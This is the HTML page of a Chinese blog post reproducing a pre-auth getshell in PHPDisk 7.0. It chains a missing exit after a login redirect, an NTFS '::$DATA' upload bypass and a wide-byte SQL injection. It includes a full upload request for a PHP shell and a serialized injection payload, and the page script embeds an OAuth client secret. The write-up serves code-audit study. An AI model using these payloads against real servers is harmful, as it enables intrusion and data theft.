@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      phpdisk前台Getshell(复现) | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>phpdisk前台Getshell(复现)</h2>
+  <p class="post-date">2019-07-09 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>翻论坛时候看到一篇前台Getshell审计文章，里面综合的姿势很多，遂复现一波<a href="https://xz.aliyun.com/t/5594#toc-5" target="_blank" rel="noopener">@lz1y</a>。复现时候也是要求自己按正常代码审计来实现，也遇到很多坑。</p>
+<h1 id="PHPDISK"><a href="#PHPDISK" class="headerlink" title="PHPDISK"></a>PHPDISK</h1><p>phpdisk是国内最大的网络存储、云存储系统开发及服务提供商，长期专注于网络存储系统开发，是一套采用PHP和MySQL构建的网络硬盘(文件存储管理)系统，可替代传统的FTP文件管理。友好的界面，操作的便捷深受用户的欢迎。可用于网络上文件办公、共享、传递、查看的多用户文件存储系统。<br>最新版的下载地址为:<br><a href="http://bbs1.phpdisk.com/thread-5384-1-1.html" target="_blank" rel="noopener">http://bbs1.phpdisk.com/thread-5384-1-1.html</a></p>
+<h1 id="路由和全局变量过滤情况"><a href="#路由和全局变量过滤情况" class="headerlink" title="路由和全局变量过滤情况"></a>路由和全局变量过滤情况</h1><p>路由比较简单/文件名?action=xxx<br>存在全局过滤操作dosafe.php，几乎过滤所有的sql注入的参数</p>
+<h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><blockquote>
+<p>phpstudy<br>windows 10<br>GBK版本</p>
+</blockquote>
+<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><ol>
+<li>从<strong>mydisk.php</strong>为权限判断未<code>exit</code>导致可以越权访问<strong>mydisk.php</strong></li>
+<li>利用windows下的NTFS ADS流trick绕过文件名后缀限制</li>
+<li>通过<strong>phpdisk</strong>的版本<code>iconv</code>编码转化使用不当造成宽字节注入找到后台(已知漏洞)</li>
+</ol>
+<h1 id="windows环境下文件上传绕过"><a href="#windows环境下文件上传绕过" class="headerlink" title="windows环境下文件上传绕过"></a>windows环境下文件上传绕过</h1><p>先通过黑盒审计方式随手上传一个php文件，发现文件名以xxxx.php.txt方式显示。白盒审计找到文件名变化处判断是否可以绕过</p>
+<p><strong>/upload/modules/upload.inc.php</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file_ext &#x3D; get_real_ext($file_extension);</span><br><span class="line"></span><br><span class="line">$dest_file &#x3D; $file_real_path.$file_store_path.$file_real_name_store.$file_ext;</span><br></pre></td></tr></table></figure>
+<p>溯源操作该变量的关键逻辑和方法<code>get_real_ext</code><br><img src="./1.png" alt=""></p>
+<h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;filter_extension&#39; &#x3D;&gt; &#39;asp,asa,aspx,ascx,dtd,xsd,xsl,xslt,as,wml,java,vtm,vtml,jst,asr,php,php3,php4,php5,vb,vbs,jsf,jsp,pl,cgi,js,html,htm,xhtml,xml,css,shtm,cfm,cfml,shtml,bat,sh&#39;,</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><p>php在window的时候如果文件名+<code>”::$DATA”</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名.且保持<code>”::$DATA”</code>之前的文件名。</p>
+<h1 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h1><p>文件上传入口文件是在mydisk.php，判断用户登录权限为<code>phpdisk_core::user_login()</code>跟进函数查看逻辑<br><img src="./2.png" alt=""><br>执行完之后进行302跳转，并未结束程序,可以继续执行mydisk.php代码</p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>由于该cms存在gbk版本，有编码操作，全局搜索iconv。如果使用不当可以绕过转义<br>/upload/ajax.php case ‘uploadCloud’下存在宽字节注入.可利用是在else语句，通过base64_encode可以绕过全局sql过滤.<br><img src="./3.png" alt=""><br>$data值可控，且执行sql语句使用iconv编码为gbk</p>
+<p>跟进sql_arrary($ins)函数，观察sql语句组合情况。使用sprintf格式化，函数返回通过逗号拆分语句<br><img src="./4.png" alt=""></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="越权上传文件"><a href="#越权上传文件" class="headerlink" title="越权上传文件"></a>越权上传文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;phpdisk_v7.0_gbk&#x2F;upload&#x2F;mydisk.php?item&#x3D;upload&amp;is_public&#x3D;0&amp;cate_id&#x3D;0&amp;subcate_id&#x3D;0&amp;folder_node&#x3D;0&amp;folder_id&#x3D;-1&amp;uid&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.56.101</span><br><span class="line">Content-Length: 747</span><br><span class="line">Origin: http:&#x2F;&#x2F;192.168.56.101</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;73.0.3683.86 Safari&#x2F;537.36</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">X-Requested-With: ShockwaveFlash&#x2F;32.0.0.207</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.56.101&#x2F;phpdisk_v7.0_gbk&#x2F;upload&#x2F;mydisk.php?item&#x3D;upload&amp;is_public&#x3D;&amp;cate_id&#x3D;&amp;subcate_id&#x3D;&amp;folder_node&#x3D;0&amp;folder_id&#x3D;-1&amp;uid&#x3D;1&amp;___t0.043556519769546664</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: PHPSESSID&#x3D;g2jf402oh26ig6pqftcrjsdpr5; XDEBUG_SESSION&#x3D;PHPSTORM</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Filename&quot;</span><br><span class="line"></span><br><span class="line">shell.php</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;desc11&quot;</span><br><span class="line"></span><br><span class="line">desc112</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;task&quot;</span><br><span class="line"></span><br><span class="line">doupload</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_id&quot;</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;shell.php::$DATA&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">phpinfo();</span><br><span class="line"></span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Submit Query</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2--</span><br></pre></td></tr></table></figure>
+<p><img src="./5.png" alt=""></p>
+<h2 id="sql注入获取文件名"><a href="#sql注入获取文件名" class="headerlink" title="sql注入获取文件名"></a>sql注入获取文件名</h2><p>viewfile.php?file_id=1可以显示文件信息,注入回显点为<strong><em>file_descripttion字段</em></strong>。前提是得到fike_id值,可以通过爆破获得。还有一种方法就是在插入payload时候将文件名设置为共享即in_share=1.</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;array(&quot;file_id&quot;&#x3D;&gt;&quot;1000&quot;,&quot;file_name&quot;&#x3D;&gt;&quot;od錦&#39;,&#96;in_share&#96;&#x3D;1,&#96;file_description&#96;&#x3D;(select x.a from (select concat(file_store_path,file_real_name)a from pd_files where file_extension&#x3D;0x7068703a3a2444415441)x)#&quot;);</span><br><span class="line">echo base64_encode(serialize($a));</span><br></pre></td></tr></table></figure>
+
+<h2 id="curl传入data值"><a href="#curl传入data值" class="headerlink" title="curl传入data值"></a>curl传入data值</h2><p><img src="./6.png" alt=""></p>
+<p>从共享文件处找到<strong>od錦</strong>，可得回显的<strong>file_description字段</strong>，得到文件路径和文件名。<br><img src="./7.png" alt=""></p>
+<p>访问<a href="http://192.168.56.101/phpdisk_v7.0_gbk/upload/filestores/2019/07/09/4265f571116622aa7ca543ecb18f4f6a.php" target="_blank" rel="noopener">http://192.168.56.101/phpdisk_v7.0_gbk/upload/filestores/2019/07/09/4265f571116622aa7ca543ecb18f4f6a.php</a><br><img src="./8.png" alt=""></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li>程序代码如３０２跳转如果未正确exit导致越权</li>
+<li>phpstorm动态审计找到<strong>文件名判断或修改</strong>处进行溯源</li>
+<li><a href="https://xz.aliyun.com/t/2539" target="_blank" rel="noopener">https://xz.aliyun.com/t/2539</a> Windows下的NTFS ADS流</li>
+<li>身份判断一般出现在文件入口处，分析逻辑判断是否可以越权</li>
+<li>三种后台姿势<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">找到sql注入，注入出真实文件名</span><br><span class="line">删除index.htm，达成目录遍历</span><br><span class="line">使用Windows下的部分PHP函数的正则匹配（案例：DEDECMS寻找后台）</span><br></pre></td></tr></table></figure></li>
+<li>存在多版本是否查询是否存在编码转换操作不当，可能造成宽字节注入</li>
+<li>还有…别啃无用代码</li>
+</ol>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#代码审计" >
+    <span class="tag-code">代码审计</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/07/08/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+        <span class="nav-arrow">← </span>
+        
+          Flask框架学习笔记
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/07/10/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
+        
+          PHP文件上传漏洞总结
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#前言"><span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#PHPDISK"><span class="toc-nav-text">PHPDISK</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#路由和全局变量过滤情况"><span class="toc-nav-text">路由和全局变量过滤情况</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#复现环境"><span class="toc-nav-text">复现环境</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#漏洞成因"><span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#windows环境下文件上传绕过"><span class="toc-nav-text">windows环境下文件上传绕过</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#黑名单"><span class="toc-nav-text">黑名单</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#绕过方式"><span class="toc-nav-text">绕过方式</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#权限绕过"><span class="toc-nav-text">权限绕过</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#宽字节注入"><span class="toc-nav-text">宽字节注入</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#漏洞复现"><span class="toc-nav-text">漏洞复现</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#越权上传文件"><span class="toc-nav-text">越权上传文件</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#sql注入获取文件名"><span class="toc-nav-text">sql注入获取文件名</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#curl传入data值"><span class="toc-nav-text">curl传入data值</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#总结"><span class="toc-nav-text">总结</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/07/09/phpdisk前台Getshell-复现/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "phpdisk前台Getshell(复现)",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
